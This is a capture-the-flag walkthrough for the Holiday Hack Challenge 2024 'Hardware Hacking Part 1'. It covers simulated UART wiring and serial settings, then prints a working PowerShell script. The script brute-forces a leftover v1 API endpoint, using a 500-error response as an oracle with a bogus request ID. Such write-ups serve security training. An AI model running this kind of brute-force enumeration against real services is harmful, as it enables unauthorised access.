
> [!NOTE]
> Before attempting this challenge, you should first complete the 'Frosty Keypad' challenge, after which you should speak with Morcel Nougat, after which you should solve the 'shreds.zip' challenge.

> After solving the 'Slices.zip' challenge, we revealed the following information:
> 
> ~~~
> BAUD         : 115200
> PARITY       : EVEN
> DATA         : 7 BITS
> STOPPITS     : 1 BIT
> FLOW CONTROL : RTS
> ~~~
> 
> ### Silver Medal

Click the 'Hardware Part 1' trunk box:

> ![Pasted image 20241128171603](attachments/Pasted%20image%2020241128171603.png)
> 
> The manual shows the NP2103 UART-BRIDGE pinout:
> 
> ![Pasted image 20241128174117](attachments/Pasted%20image%2020241128174117.png)
> 
> ~~~
> Pin 4: VCC (rightmost pin)
> Pin 3: TX
> Pin 2: RX
> Pin 1: GND (leftmost pin)
> ~~~

Click the 'X' in the top right of the book to close the book and reveal the UART device:

> ![Pasted image 20241128180556](attachments/Pasted%20image%2020241128180556.png)
> 
> The RED jumper wire connects the UART module's pin 4 (VCC) to the board's pin 1 (V)
> The GREEN jumper wire connects the UART module's pin 2 (RX) to the board's pin 2 (T)
> The ORANGE jumper wire connects the UART module's pin 3 (TX) to the board's pin 3 (R)
> The BLACK jumper wire connects the UART module's pin 1 (GND) to the board's pin 4 (G)
> 
> ![Pasted image 20241128183627](attachments/Pasted%20image%2020241128183627.png)

> [!TIP]
> If you don't know the correct voltage of a device, it's best to start with the lowest voltage instead of risking an overvoltage that could damage the device. 

> The arrow from VCC - Voltage to 3V in the manual seems to indicate the correct voltage is 3V, but the arrow could also point at '3V or 5V', so we must be careful.
> 
> The source-code tells us that the correct voltage is 3V:
> ~~~
> if (this.uV === 3 && this.allConnectedUp && !this.usbIsAtOriginalPosition || this.dev) {
> ...
> } else {
>      if (this.uV === 5 && this.allConnectedUp && !this.usbIsAtOriginalPosition) {
>      const smoked = this.children.getByName('smoked');
>      smoked.start();
> ~~~
> But this part of the challenge is visual and aims to teach about real-world conditions - we play along with the game and safely use a 3V setting first.

Click the UART device to change the UART module mode to 3V:

> ![Pasted image 20241128184134](attachments/Pasted%20image%2020241128184134.png)

Click on the disconnected USB-C cable to plug it into the UART module:

> ![Pasted image 20241128184315](attachments/Pasted%20image%2020241128184315.png)

Click the green 'P' button in the top right to turn on the hardware device:

> ![Pasted image 20241128184409](attachments/Pasted%20image%2020241128184409.png)

Use the UP, DOWN, LEFT and RIGHT arrows on the device and configure these settings:

> ~~~
> Port      : USB0
> Baud Rate : 115200
> Parity    : even
> Data      : 7 bit
> Stop bits : 1 bit
> Flow Ctrl : RTS
> ~~~
> 
> ![Pasted image 20241128184752](attachments/Pasted%20image%2020241128184752.png)

Click the 'S' button on the hardware device to start the connection:

> ![Pasted image 20241128185034](attachments/Pasted%20image%2020241128185034.png)
> 
> This completes the Silver challenge:
> 
> ![Pasted image 20241128185206](attachments/Pasted%20image%2020241128185206.png)
> 
> ### Gold Medal
> 
> In the source-code of the challenge file 'main.js' we see a comment that mentions that some resourceful elves managed to brute-force their way in through the v1 API:
> 
> ![Pasted image 20241128190313](attachments/Pasted%20image%2020241128190313.png)
> 
> We can see what the 'serial' value consists of by reading lines 209 - 224:
> 
> ![Pasted image 20241128191451](attachments/Pasted%20image%2020241128191451.png)
> 
> We can see that the options should be in this format:
> 
> ~~~
> ['port', 'baud', 'parity', 'bits', 'stopbits', 'flow ctrl'];
> ~~~
> 
> Since there are 4 port options, 10 baud options, 3 parity options, 4 databits options, 2 stopbits options, and 4 flow ctrl options, we can calculate the total amount of permutations of the 'serial' variable to 4 \* 10 \* 3 \* 4 \* 2 \* 4 = 3840
> 
> Since we have two voltage options, either '3 Volt' or '5 Volt', the maximum total number of brute-force permutations becomes 7680. That's quite a few attempts, but is quite brute-forceable.
> 
> If the '/api/v1/complete' API endpoint was not removed, it may be possible to brute-force the endpoint to find the correct answer.
> 
> The following PowerShell script will brute-force the v1 API to find the correct answer:

```
function Start-BruteForce {
    Clear-Host
    # Configuration
    $url = "https://hhc24-hardwarehacking.holidayhackchallenge.com/api/v1/complete"
    $rid = "00000000-0000-0000-0000-000000000000"
    $ProgressPreference = 'SilentlyContinue'  # Hide progress bar

    # Create a single session for all requests before we start
    $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
    $session.UserAgent = "JollyFrogs Hardware Hacking Brute-Forcer"

    function Send-VoltageTest {
        param (
            [string]$serial,
            [string]$voltage,
            [string]$requestId = $rid
        )
        
        $bodyJson = @{
            requestID = $requestId
            serial = $serial.ToCharArray() | ForEach-Object { [int]::Parse($_.ToString()) }
            voltage = [int]$voltage
        } | ConvertTo-Json

        Write-Host "`rCombination: $serial - Trying" -NoNewline

        try {
            $response = Invoke-WebRequest -UseBasicParsing -Uri $url `
                -Method "POST" `
                -WebSession $session `
                -Headers @{
                    "authority" = "hhc24-hardwarehacking.holidayhackchallenge.com"
                    "method" = "POST"
                    "path" = "/api/v1/complete"
                    "scheme" = "https"
                } `
                -ContentType "application/json" `
                -Body $bodyJson

            if ($response.Content -eq "true") {
                Write-Host "`rCombination: $serial - Success!" -ForegroundColor Green
                return $true
            }
            return $false
        }
        catch {
            if ($_.Exception.Response.StatusCode.value__ -eq 500) {
                Write-Host "`rCombination: $serial - Found it! (500 error)" -ForegroundColor Yellow
                Write-Host "`nCorrect combination found:"
                Write-Host "Serial: $serial"
                Write-Host "Voltage: ${voltage}V"

                # Prompt for real RID
                Write-Host "`nPlease enter your real Request ID: " -NoNewline -ForegroundColor Cyan
                $realRid = Read-Host

                # Try with real RID
                Write-Host "`nTrying combination with your Request ID..." -ForegroundColor Cyan
                $finalResult = Send-VoltageTest -serial $serial -voltage $voltage -requestId $realRid
                if ($finalResult -eq $true) {
                    Write-Host "Success! The challenge should now be completed!" -ForegroundColor Green
                }
                return "found"
            }
            return $null
        }
    }

    # Try each voltage level
    foreach ($voltage in @("3", "5")) {
        Write-Host "Trying all ${voltage}V combinations..." -ForegroundColor Cyan
        
        # Optimized ranges
        $d1 = 3..0
        $d2 = 9..0
        $d3 = 2..0
        $d4 = 3..0
        $d5 = 1..0
        $d6 = 3..0

        foreach ($i in $d1) {
            foreach ($j in $d2) {
                foreach ($k in $d3) {
                    foreach ($l in $d4) {
                        foreach ($m in $d5) {
                            foreach ($n in $d6) {
                                $serial = "$i$j$k$l$m$n"
                                $result = Send-VoltageTest -serial $serial -voltage $voltage
                                if ($result -eq "found") {
                                    return
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    Write-Host "`nBrute force completed without finding solution." -ForegroundColor Yellow
    Write-Host
}

# Execute the function
Start-BruteForce
```

> [!NOTE]
> The script will brute-force the correct answer using a bogus id of '00000000-0000-0000-0000-000000000000'. This works because the server returns an error code 500 when the correct serial is sent with a bogus id, because the id is considered invalid. The difference between valid HTTP response codes that contain the content 'False' and a HTTP code 500 means we can detect the correctness of the answer from the returned HTTP code, even when we use a bogus id.

> Once the correct answer is found, the script will ask you for your real id, and if you give the script your real id, the script will send the correct brute-forced serial together with your id, and the game awards you with the gold medal.

> [!NOTE]
> You can get your id value by running the following command in the Console:
> ~~~
> getResourceID()
> ~~~
> Make sure your console context is set to 'hhc24-hardwarehacking.holidayhackchallenge.com' before you run the 'getResourceID()' command:
> ![](attachments/Pasted%20image%2020241129015742.png)

> The output of running the script:
> 
> ![Pasted image 20241128200909](attachments/Pasted%20image%2020241128200909.png)
> 
> Medal progress:
> 
> ![Pasted image 20241128202201](attachments/Pasted%20image%2020241128202201.png)